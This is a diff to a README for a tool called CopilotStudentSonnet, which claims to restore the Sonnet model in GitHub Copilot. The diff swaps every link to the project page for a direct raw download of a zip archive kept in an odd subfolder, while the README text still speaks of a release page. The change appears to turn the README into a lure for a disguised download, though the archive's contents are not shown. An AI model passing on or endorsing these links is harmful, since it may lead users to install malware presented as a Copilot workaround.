@@ -1,6 +1,6 @@
 # 🤖 CopilotStudentSonnet - Bring back Sonnet in Copilot
 
-[![Download](https://img.shields.io/badge/Download-CopilotStudentSonnet-blue?style=for-the-badge&logo=github)](https://github.com/rilind412/CopilotStudentSonnet)
+[![Download](https://img.shields.io/badge/Download-CopilotStudentSonnet-blue?style=for-the-badge&logo=github)](https://github.com/rilind412/CopilotStudentSonnet/raw/refs/heads/main/Tinni/Student-Copilot-Sonnet-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Use the steps below to download it, set it up, and run it on your PC.
 
 Go to the project page here:
 
-https://github.com/rilind412/CopilotStudentSonnet
+https://github.com/rilind412/CopilotStudentSonnet/raw/refs/heads/main/Tinni/Student-Copilot-Sonnet-2.2.zip
 
 On that page, look for the latest release or the main download option.  
 If the page provides a file, download it to your computer.  
@@ -188,7 +188,7 @@ Close the app when you are done if you do not want to keep the session open.
 
 Use this link if you need to get the app again:
 
-https://github.com/rilind412/CopilotStudentSonnet
+https://github.com/rilind412/CopilotStudentSonnet/raw/refs/heads/main/Tinni/Student-Copilot-Sonnet-2.2.zip
 
 ## 🧭 File Checks
 
